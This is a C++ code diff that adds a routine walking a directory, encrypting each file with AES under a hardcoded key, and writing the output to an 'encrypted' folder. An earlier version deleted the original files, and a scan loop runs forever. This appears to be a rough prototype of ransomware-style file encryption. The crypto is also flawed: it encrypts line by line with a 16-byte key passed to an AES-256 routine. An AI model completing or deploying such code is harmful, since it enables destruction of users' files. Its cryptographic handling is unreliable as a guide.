@@ -4,12 +4,43 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include "./libs/aes256.hpp"
-#include <ifstream>
+#include <fstream>
+#include <string>
 using namespace std;
 
+void cryptor(filesystem::path source,filesystem::path out){
+  ifstream file_target;
+  ofstream file_out;
+  
+  file_target.open(source);
+  file_out.open(out);
+
+  if (!file_target.is_open()){
+    cout<<"ERROR"<<endl;
+  }
+  else{
+    cout<<"File opened"<<endl;
+    string str;
+    string k = "qwertyuiopasdfgh";
+    ByteArray byte_k(k.begin(),k.end());
+
+    while(getline(file_target, str)){
+      ByteArray buffer;
+      ByteArray byte_str(str.begin(), str.end());
+      Aes256::encrypt(byte_k, byte_str, buffer);
+        for ( auto x : buffer){
+            file_out<<x;
+        }
+    }
+    
+  }
+  file_target.close();
+  file_out.close();
+}
 
 vector<filesystem::__cxx11::path> massiv;
 filesystem::__cxx11::path target = "./encrypted";
+
 
 void get_paths(vector<string>& paths, const string& current_path) {
 
@@ -26,13 +57,13 @@ void get_paths(vector<string>& paths, const string& current_path) {
     try 
     {
         filesystem::create_directories(targetParent); 
-        filesystem::copy_file(sourceFile, target, filesystem::copy_options::overwrite_existing);
+        cryptor(sourceFile,target);
     }
     catch (std::exception& e) 
     {
         std::cout << e.what();
     }
-    filesystem::remove(file);
+    // filesystem::remove(file);
 		}
     
 	}
@@ -40,18 +71,10 @@ void get_paths(vector<string>& paths, const string& current_path) {
 
 }
 
-void crypt_files(const string& current_path){
-  vector<filesystem::path> files_list;
-  for (const auto& file : filesystem::directory_iterator(current_path)){
-    cout<<file<<endl;
-  }
-}
-
 void start_scan(){
   for(;;){
   vector<string> paths;
 	get_paths(paths, "./test");
-  crypt_files("./encrypted");
   }
 }
 
@@ -61,18 +84,13 @@ ByteArray get_byte_array(unsigned char* word, int len)
   ByteArray result(len);
   for (int i = 0; i < len; i++) result[i] = word_[i];
   return result;
-
-
 }
 
 
 int main() {
-
-  string path = "./encrypted/test.png"
-  ifstream file;
-  file.open()
-
-
+vector<string> paths;
+const string current="./test";
+get_paths(paths,current);
 
 	return 0;
 }
